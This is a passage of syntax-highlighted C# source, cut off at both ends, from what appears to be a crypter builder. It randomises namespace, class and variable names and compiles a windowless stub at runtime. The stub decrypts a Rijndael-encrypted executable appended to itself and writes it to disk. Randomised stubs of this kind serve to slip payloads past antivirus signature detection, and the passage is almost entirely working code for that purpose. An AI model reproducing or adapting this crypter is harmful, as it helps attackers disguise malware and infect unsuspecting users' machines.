                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc11">encFile</span><span class="sc10">))</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Delete</span><span class="sc10">(</span><span class="sc11">encFile</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Decryptor</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">seq</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">blocks</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">vlength</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">hlength</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">elength</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">   
            </span><span class="sc2">//generate a new random temp file name for our decryptor
</span><span class="sc0">            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">myDir</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">slash</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">RandomWords</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".exe"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">ICodeCompiler</span><span class="sc0"> </span><span class="sc11">ic</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">CSharpCodeProvider</span><span class="sc10">().</span><span class="sc11">CreateCompiler</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">CompilerParameters</span><span class="sc0"> </span><span class="sc11">cp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">CompilerParameters</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">cp</span><span class="sc10">.</span><span class="sc11">ReferencedAssemblies</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc6">"System.dll"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">cp</span><span class="sc10">.</span><span class="sc11">GenerateExecutable</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">cp</span><span class="sc10">.</span><span class="sc11">CompilerOptions</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"/target:winexe"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">cp</span><span class="sc10">.</span><span class="sc11">OutputAssembly</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc2">//we will use r or Random to determine
</span><span class="sc0">            </span><span class="sc2">//which code gets run and to randomly select
</span><span class="sc0">            </span><span class="sc2">//a marker
</span><span class="sc0">            </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc2">//we build a hash table with all sorts of random words
</span><span class="sc0">            </span><span class="sc2">//this way we don't declare more variables and we can still
</span><span class="sc0">            </span><span class="sc2">//retrieve their value based on an index
</span><span class="sc0">            </span><span class="sc11">Hashtable</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Hashtable</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">hi</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">hi</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">50</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">hi</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">val</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">RandomWord</span><span class="sc10">().</span><span class="sc11">RandomWords</span><span class="sc10">(</span><span class="sc11">r</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">12345</span><span class="sc10">));</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">wordList</span><span class="sc10">.</span><span class="sc11">IndexOf</span><span class="sc10">(</span><span class="sc11">val</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">val</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">val</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">DateTime</span><span class="sc10">.</span><span class="sc11">Now</span><span class="sc10">.</span><span class="sc11">Millisecond</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">wordList</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">val</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">hashish</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">hi</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">val</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc2">//Store all the directives into an array that we can randomly sort the order
</span><span class="sc0">            </span><span class="sc2">//then we then just concatenate them to the directives string for use later
</span><span class="sc0">            </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">direct</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc6">"using System; \n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"using System.Security.Cryptography; \n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"using System.Text; \n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"using System.Diagnostics; \n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"using System.IO; \n"</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
            </span><span class="sc11">Array</span><span class="sc10">.</span><span class="sc11">Sort</span><span class="sc10">(</span><span class="sc11">direct</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">directives</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">di</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">di</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">direct</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">di</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">directives</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">direct</span><span class="sc10">[</span><span class="sc11">di</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc2">//start the main namespace and class 
</span><span class="sc0">            </span><span class="sc2">//the code is either going to use Main() or generate a new function that gets called
</span><span class="sc0">            </span><span class="sc2">//inside Main()
</span><span class="sc0">            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">codestart</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"namespace "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"{ \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"   class "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" { \n"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">r</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">codestart</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">" public static void Main() { \n"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">//our random function name that is called in Main()
</span><span class="sc0">                </span><span class="sc11">codestart</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">" public static void Main() { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                </span><span class="sc6">"   "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                </span><span class="sc6">"} \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                </span><span class="sc6">"private static void "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"() { \n"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc2">// host - encrypted file
</span><span class="sc0">            </span><span class="sc2">// pass in the total size of the encrypted file
</span><span class="sc0">            </span><span class="sc2">// then subtract this from the current file length
</span><span class="sc0">            </span><span class="sc2">// this will then get the starting offset on where to read the
</span><span class="sc0">            </span><span class="sc2">// encrypted bytes
</span><span class="sc0">            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">ofFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">myDir</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">slash</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".exe"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">readEnc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"string "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">5</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"FileInfo "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">6</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = new FileInfo("</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">5</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"); \n "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"int "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">7</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = (((int)"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">6</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Length) - "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">elength</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"byte[] "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">8</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = new byte["</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">6</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Length]; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"FileStream "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">9</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = new FileStream(@"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">5</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">", FileMode.Open, FileAccess.Read); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"BinaryReader "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">10</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = new BinaryReader("</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">9</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"for(int "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">11</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = 0; "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">11</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" &lt; "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">8</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Length; "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">11</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"++) { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">" "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">8</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"["</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">11</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"] = "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">10</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".ReadByte(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"} \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">10</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Close(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">9</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Close(); \n"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">encFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">myDir</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">slash</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">RandomWords</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".exe"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">writeEnc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"FileStream "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">12</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = new FileStream(@\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">encFile</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\", FileMode.Create, FileAccess.Write); \n "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"BinaryWriter "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">13</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = new BinaryWriter("</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">12</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"); \n "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"for(int "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">14</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">7</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"; "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">14</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" &lt; "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">8</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Length; "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">14</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"++) { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">13</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".BaseStream.WriteByte("</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">8</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"["</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">14</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"]); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"} \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">13</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Flush(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">13</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Close(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">12</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Close(); \n"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">decrypt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"UnicodeEncoding "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">15</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = new UnicodeEncoding(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"byte[] "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">16</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">15</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".GetBytes(\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\"); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"FileStream "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">17</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = new FileStream(@\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">encFile</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\", FileMode.Open); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"RijndaelManaged "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">18</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = new RijndaelManaged(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"CryptoStream "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">19</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = new CryptoStream("</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">17</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">", "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">18</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".CreateDecryptor("</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">16</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">","</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">16</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"), CryptoStreamMode.Read); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"FileStream "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">20</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = new FileStream(@\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ofFile</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\", FileMode.Create); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"int "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">21</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"while(("</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">21</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">19</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".ReadByte()) != -1) { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
